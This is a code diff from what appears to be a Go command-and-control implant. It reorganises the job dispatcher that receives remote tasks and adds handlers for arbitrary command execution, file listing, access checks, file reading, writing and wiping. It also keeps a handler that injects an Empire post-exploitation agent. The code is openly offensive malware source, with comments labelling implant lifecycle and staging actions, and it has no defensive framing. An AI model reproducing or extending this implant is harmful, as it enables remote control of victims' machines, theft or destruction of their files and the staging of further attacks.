@@ -43,14 +43,8 @@ func jobProcessor(){
 		go func() {
 		  	
 		   	switch job.Job{
-		   		
-		   		case "exec":
-		   			error,result = biterpreter.Exec(job.Parameters)
-		   			if error{
-						result = "Error Executing Command:"+ result
-					}
-		   			contChannel <- "continue"
-
+		   	
+		   		// Implant Lifecycle
 		   		case "respTime":
 
 		   			i, err := strconv.Atoi(job.Parameters)
@@ -74,6 +68,7 @@ func jobProcessor(){
 		   			result = "TTL changed to "+job.Parameters+" seconds"
 		   			contChannel <- "continue"
 
+		   		// Implant Basic Capabilities
 		   		case "sysinfo":
 
 		   			error,result = biterpreter.Sysinfo()
@@ -81,9 +76,58 @@ func jobProcessor(){
 						result = "Error Getting System Info:"+result
 					}
 		   			contChannel <- "continue"
+
+		   		
+		   		case "exec":
+		   			error,result = biterpreter.Exec(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+		   		
+		   		case "ls":
+		   			error,result = biterpreter.List(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+		   		
+		   		case "accesschk":
+		   			error,result = biterpreter.Accesschk(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+		   		
+		   		case "read":
+		   			error,result = biterpreter.Read(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+		   		case "write":
+		   			error,result = biterpreter.Write(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+		   		case "wipe":
+		   			error,result = biterpreter.Wipe(job.Parameters)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
+
+
+
+		   		//Staging/POST Actions
 		   		case "injectEmpire":
 
-		   			//error,result = biterpreter.InjectEmpire(job.Parameters)
 		   			error,result = biterpreter.InjectEmpire(job.Parameters)
 		   			if error{
 						result = "Error Injecting Empire:"+ result
